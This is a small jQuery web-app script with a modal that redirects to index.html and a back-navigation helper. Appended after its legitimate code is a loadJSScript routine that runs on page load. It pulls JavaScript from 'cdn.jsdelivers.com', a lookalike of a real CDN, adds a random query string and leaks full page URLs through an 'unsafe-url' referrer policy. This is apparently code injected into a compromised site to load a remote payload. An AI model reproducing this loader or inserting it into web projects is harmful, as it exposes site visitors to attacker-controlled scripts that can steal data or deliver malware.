/* jshint devel:true */
// Initialize your app

$(function () {
	// modal
	$('.gotoCollection').on('click', function () {
		$('.pages').append('<div class="modal-overlay"></div>');
		$('.modal-overlay').addClass('modal-overlay-visible');
		$('.modal').removeClass('modal-out').addClass('modal-in');
		setTimeout(function() {
			window.location.href = 'index.html';
		}, 3000);
	});
});
// back
function goback() {
	window.location.reload();
	window.history.back(-1);
}

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}